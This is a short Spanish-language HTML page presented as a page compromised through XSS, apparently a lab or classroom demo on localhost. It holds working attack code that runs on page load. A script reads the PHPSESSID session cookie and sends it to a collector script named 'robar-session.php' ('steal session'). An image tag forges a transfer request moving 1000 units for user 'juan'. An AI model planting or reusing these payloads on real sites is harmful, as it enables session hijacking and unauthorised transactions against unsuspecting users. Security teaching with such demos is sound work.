<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
</head>
<body>
    Esta es una página que ha sido hackeada mediante XSS.
Al acceder, envía la cookie de sesión al sitio http://evil.local 
o a http://127.0.0.1:8087/
<img src='http://127.0.0.1:8088/public_html/transfer.php?quantity=1000&user=juan'>

<script>
var c = document.cookie.replace(/(?:(?:^|.*;\s*)PHPSESSID\s*\=\s*([^;]*).*$)|^.*$/, "$1")
var myImage = new Image(1,1);
myImage.src = "http://127.0.0.1:8087/public_html/robar-session.php?session_robada=" + c;

</script>



</body>
</html>

